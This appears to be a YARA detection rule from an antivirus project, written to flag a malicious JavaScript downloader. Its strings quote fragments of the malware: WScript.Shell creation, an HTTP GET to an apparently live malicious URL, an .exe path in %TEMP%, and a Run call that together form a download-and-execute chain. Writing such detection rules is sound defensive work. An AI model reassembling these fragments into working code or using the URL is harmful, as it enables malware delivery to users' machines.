rule sig_20160330_e95be808382419cd7731e9813a4e9ea2 {
  meta:
    description = "datamaliciousorder - file 20160330_e95be808382419cd7731e9813a4e9ea2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "470b1729c125163d098098a3ca8b2c8395ea38ffd08ece89905cab1f7bcb1a70"

  strings:
    $s1  = "function P(CE, T){G = G * 1; return CE - T;};" fullword ascii
    $s2  = "var EU = function NZ() {return WScript[RC](\"WScript\"+\".Shell\");}(), F = 11;" fullword ascii
    $s3  = "AS[WY](\"GET\", \"http://grzegorzschreiber.pl/n7dak\", false);" fullword ascii
    $s4  = "if (AS[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function J(){return DZ + \"\";};" fullword ascii
    $s6  = "function LQ() {return EU[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"aWAahiGuo2.ex\" + \"e\";};" fullword ascii
    $s7  = "function RH(CG){EU[\"Run\"](CG, G, G);};" fullword ascii
    $s8  = "function EF() {return ((U1 == true) && (U1 == L0)) ? 1 : G;};" fullword ascii
    $s9  = "function CY()" fullword ascii
    $s10 = "function RM(){return RC;};" fullword ascii
    $s11 = "function Z(U0) {var V = (1, 2, 3, 4, 5, U0); return V;};" fullword ascii
    $s12 = "function Z0(){return 22;};" fullword ascii
    $s13 = "return P(G0, ME);" fullword ascii
    $s14 = "}while (IQ);" fullword ascii
    $s15 = "var I = new this[\"Date\"]();" fullword ascii
    $s16 = "L0 = true; " fullword ascii
    $s17 = "var L0 = false;" fullword ascii
    $s18 = "var U1 = false;" fullword ascii
    $s19 = "var QR = false;" fullword ascii
    $s20 = "U1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}